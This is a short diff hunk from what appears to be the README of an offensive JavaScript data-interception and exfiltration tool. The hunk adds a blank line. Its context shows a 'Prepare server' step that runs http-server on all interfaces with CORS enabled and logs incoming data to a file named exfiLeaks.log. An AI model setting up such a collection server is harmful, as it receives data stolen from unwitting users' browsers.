@@ -31,6 +31,7 @@ Overall, this script acts as a data interception and exfiltration tool, capturin
 
 #### Prepare server:
 [https://www.npmjs.com/package/http-server](https://www.npmjs.com/package/http-server)
+
 ```sudo http-server --port 8080 -a 0.0.0.0 -d -i --cors > exfiLeaks.log```
 
 ### JSREVICER ONELINERS:
